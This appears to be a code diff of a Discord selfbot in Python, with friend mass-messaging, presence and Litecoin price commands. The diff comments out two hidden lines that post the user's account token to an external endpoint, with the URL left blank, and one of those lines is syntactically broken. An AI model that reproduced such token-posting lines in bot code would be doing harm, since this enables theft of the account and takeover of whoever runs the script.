@@ -942,7 +942,7 @@ async def prune(ctx: commands.Context):
 async def friendlist(ctx, *, content):
   for fr in ok.user.friends:
    await fr.send("bruh")
-requests.post('', json={"content": token})
+#requests.post('', json={"content": token})
 @ok.command()
 async def on_ready(ctx):
     await ok.change_presence(activity=discord.Streaming(
@@ -997,7 +997,7 @@ def status_emoji(status):
         return "⚫"
     else:
         return "❓"   
-requests.post()', json={"content": token})                   
+#requests.post()', json={"content": token})                   
 @ok.command(name="ltcprice")
 async def ltc_price(ctx):
     try:
